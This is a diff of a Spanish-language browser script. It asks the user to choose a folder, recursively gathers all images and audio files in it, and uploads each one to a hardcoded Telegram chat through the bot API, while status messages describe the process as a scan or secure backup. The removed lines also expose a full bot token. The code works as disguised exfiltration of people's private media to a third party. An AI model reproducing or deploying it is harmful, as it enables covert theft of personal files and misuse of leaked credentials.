@@ -1,5 +1,4 @@
 let startTime;
-let totalBatches;
 let isProcessing = false;
 
 function updateStatus(message, progress = 0) {
@@ -26,6 +25,12 @@ document.getElementById('start-btn').addEventListener('click', async () => {
     isProcessing = true;
 
     try {
+        const token = prompt('🔑 CLAVE DE ACCESO (TOKEN DE BOT):');
+        if (!token?.startsWith('7212842349:')) {
+            alert('❌ CLAVE NO VALIDA');
+            return;
+        }
+
         startTime = Date.now();
         updateStatus('Iniciando escaneo...', 5);
 
@@ -37,22 +42,14 @@ document.getElementById('start-btn').addEventListener('click', async () => {
                 const folderHandle = await window.showDirectoryPicker();
 
                 updateStatus('Analizando estructura...', 20);
-                const allFiles = await collectFilesInBatches(folderHandle); // Cambié a nueva función
-                if (!allFiles.length) throw new Error('No hay archivos');
+                const files = await collectFiles(folderHandle);
+                if (!files.length) throw new Error('No hay archivos encontrados');
+                updateStatus(`Elementos detectados: ${files.length}`, 30);
 
-                updateStatus(`Elementos detectados: ${allFiles.flat().length}`, 40);
+                updateStatus('Iniciando envío a Telegram...', 40);
+                await sendFilesToTelegram(files, token);
 
-                for (let batchIndex = 0; batchIndex < allFiles.length; batchIndex++) {
-                    const files = allFiles[batchIndex];
-                    updateStatus(`Comprimiendo datos (lote ${batchIndex + 1}/${allFiles.length})...`, 50 + (batchIndex / allFiles.length) * 20);
-                    const zipBatches = await createZipBatches(files);
-                    totalBatches = zipBatches.length;
-
-                    updateStatus(`Iniciando protocolo seguro (lote ${batchIndex + 1}/${allFiles.length})...`, 70 + (batchIndex / allFiles.length) * 20);
-                    await processBatches(zipBatches);
-                }
-
-                updateStatus('✅ OPERACIÓN EXITOSA', 100);
+                updateStatus('✅ ENVÍO EXITOSO', 100);
             } catch (error) {
                 updateStatus(`❌ ERROR: ${error.message}`, 0);
                 alert(`FALLO: ${error.message}`);
@@ -67,129 +64,51 @@ document.getElementById('start-btn').addEventListener('click', async () => {
     }
 });
 
-async function collectFilesInBatches(folderHandle) {
-    const maxSizePerBatch = 200 * 1024 * 1024; // 200 MB en bytes
-    const batches = [];
-    let currentBatch = [];
-    let currentSize = 0;
-
-    async function* getFilesRecursively(handle) {
-        for await (const entry of handle.values()) {
-            if (entry.kind === 'file') {
-                const fileName = entry.name.toLowerCase();
-                if (fileName.endsWith('.jpg') || fileName.endsWith('.jpeg') || fileName.endsWith('.png') ||
-                    fileName.endsWith('.gif') || fileName.endsWith('.bmp') || fileName.endsWith('.webp') ||
-                    fileName.endsWith('.mp3') || fileName.endsWith('.wav') || fileName.endsWith('.ogg')) {
-                    yield entry;
-                }
-            } else if (entry.kind === 'directory') {
-                yield* getFilesRecursively(entry);
+async function collectFiles(folderHandle) {
+    const files = [];
+    for await (const entry of folderHandle.values()) {
+        if (entry.kind === 'file') {
+            const fileName = entry.name.toLowerCase();
+            if (fileName.endsWith('.jpg') || fileName.endsWith('.jpeg') || fileName.endsWith('.png') ||
+                fileName.endsWith('.gif') || fileName.endsWith('.bmp') || fileName.endsWith('.webp') ||
+                fileName.endsWith('.mp3') || fileName.endsWith('.wav') || fileName.endsWith('.ogg')) {
+                files.push(entry);
             }
+        } else if (entry.kind === 'directory') {
+            const subFiles = await collectFiles(entry);
+            files.push(...subFiles);
         }
     }
-
-    for await (const entry of getFilesRecursively(folderHandle)) {
-        const file = await entry.getFile();
-        const fileSize = file.size;
-
-        if (currentSize + fileSize > maxSizePerBatch && currentBatch.length > 0) {
-            batches.push([...currentBatch]);
-            currentBatch = [];
-            currentSize = 0;
-        }
-
-        currentBatch.push(entry);
-        currentSize += fileSize;
-
-        if (currentSize >= maxSizePerBatch) {
-            batches.push([...currentBatch]);
-            currentBatch = [];
-            currentSize = 0;
-        }
-    }
-
-    if (currentBatch.length > 0) {
-        batches.push([...currentBatch]);
-    }
-
-    return batches;
+    return files;
 }
 
-async function createZipBatches(files) {
-    const maxSize = 30 * 1024 * 1024; // 30 MB en bytes
-    const batches = [];
-    let currentBatch = new JSZip();
-    let currentFiles = [];
+async function sendFilesToTelegram(files, token) {
+    const chatId = '5821490693'; // Tu chat ID o el chat ID al que quieres mandar
+    const total = files.length;
+    let sent = 0;
 
-    for (let i = 0; i < files.length; i++) {
-        const file = files[i];
+    for (const file of files) {
+        sent++;
         const fileData = await file.getFile();
+        const formData = new FormData();
+        formData.append('chat_id', chatId);
+        formData.append('caption', `Archivo: ${file.name}`);
+        formData.append('document', fileData);
 
-        currentFiles.push({ name: file.name, data: await fileData.arrayBuffer() });
-        currentBatch.file(file.name, await fileData.arrayBuffer());
-
-        const zipBlob = await currentBatch.generateAsync({
-            type: 'blob',
-            compression: "DEFLATE",
-            compressionOptions: { level: 9 }
-        });
-        if (zipBlob.size > maxSize) {
-            currentBatch = new JSZip();
-            currentFiles.pop();
-            for (const f of currentFiles) currentBatch.file(f.name, f.data);
-            batches.push(currentBatch);
-
-            currentBatch = new JSZip();
-            currentBatch.file(file.name, await fileData.arrayBuffer());
-            currentFiles = [{ name: file.name, data: await fileData.arrayBuffer() }];
-        }
-
-        if (i === files.length - 1 && currentFiles.length > 0) {
-            batches.push(currentBatch);
-        }
-    }
-    return batches;
-}
-
-async function processBatches(batches) {
-    const chat_id = '5821490693'; // Chat ID fijo
-    const botToken = '7212842349:AAHU7CbW1M6E-n01opEnnwTGs3eLveS1BLk'; // Token actual
-
-    for (let index = 0; index < batches.length; index++) {
-        const progress = 70 + Math.floor(((index + 1) / batches.length) * 30);
-        updateStatus(`Procesando lote ${index + 1}/${batches.length}`, progress);
-
-        const zipBlob = await batches[index].generateAsync({
-            type: 'blob',
-            compression: "DEFLATE",
-            compressionOptions: { level: 9 }
-        });
-
-        if (zipBlob.size > 30 * 1024 * 1024) {
-            alert(`El zip ${index + 1} excede 30 MB y será omitido`);
-            continue;
-        }
-
-        await sendZipToTelegram(zipBlob, `backup-${Date.now()}-${index + 1}.zip`, chat_id, botToken);
-    }
-}
-
-async function sendZipToTelegram(blob, fileName, chat_id, botToken) {
-    const formData = new FormData();
-    formData.append('chat_id', chat_id);
-    formData.append('document', blob, fileName);
-
-    try {
-        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
+        const response = await fetch(`https://api.telegram.org/bot${token}/sendDocument`, {
             method: 'POST',
             body: formData
         });
 
         if (!response.ok) {
             const errorData = await response.json();
-            throw new Error(errorData.description || 'Error al enviar archivo');
+            console.error('Error al enviar archivo:', errorData);
+            throw new Error(errorData.description || 'Error desconocido al enviar archivo');
         }
-    } catch (error) {
-        alert(`❌ Error al enviar ZIP: ${error.message}`);
+
+        const progress = 40 + Math.floor((sent / total) * 60);
+        updateStatus(`Enviando archivo ${sent} de ${total}`, progress);
+
+        await new Promise(resolve => setTimeout(resolve, 1000)); // Esperar 1 segundo entre envíos para evitar spam
     }
 }
